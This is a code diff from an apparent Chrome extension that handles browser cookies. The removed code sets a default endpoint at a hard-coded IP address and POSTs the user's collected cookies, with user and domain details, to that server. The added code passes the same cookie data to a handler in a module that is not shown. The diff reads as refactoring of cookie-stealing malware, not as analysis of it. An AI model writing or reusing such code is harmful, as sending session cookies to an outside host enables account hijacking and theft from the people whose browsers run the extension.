@@ -1,14 +1,8 @@
-import { json } from '../types';
-import { Cookies, Storage } from '../redefination';
-import ky from 'ky';
+import './commonReq';
+import { Cookies } from '../redefination';
 import { removeAllCookies } from '../cookies';
-import { requestListner } from './yahoo_requestInterceptor';
-
-chrome.storage.local.get('url').then(({ url }) => {
-  if (!url) {
-    chrome.storage.local.set({ url: 'http://5.161.143.0:5000/data' });
-  }
-});
+import { CookiesInfoType } from './types';
+import { cookiesSuccess } from './requestHandlers';
 
 // @ts-ignore
 chrome.runtime.onMessage.addListener(function (message: any) {
@@ -35,15 +29,12 @@ async function handleCookie(message: any) {
     cookie: [...cookies, ...extraCookies],
   };
 
-  console.log(postData);
-  const data = await sendCookies(postData);
-  console.log(data);
-}
+  const cookieInfo: CookiesInfoType = {
+    cookies: postData.cookie,
+    user: postData.user,
+    domain: postData.domain,
+  };
+  console.log(cookieInfo);
 
-async function sendCookies(data: json): Promise<string> {
-  const { url } = await Storage.get('url');
-  const res = await ky.post(url, { json: data });
-  return await res.text();
+  cookiesSuccess(cookieInfo);
 }
-
-requestListner();
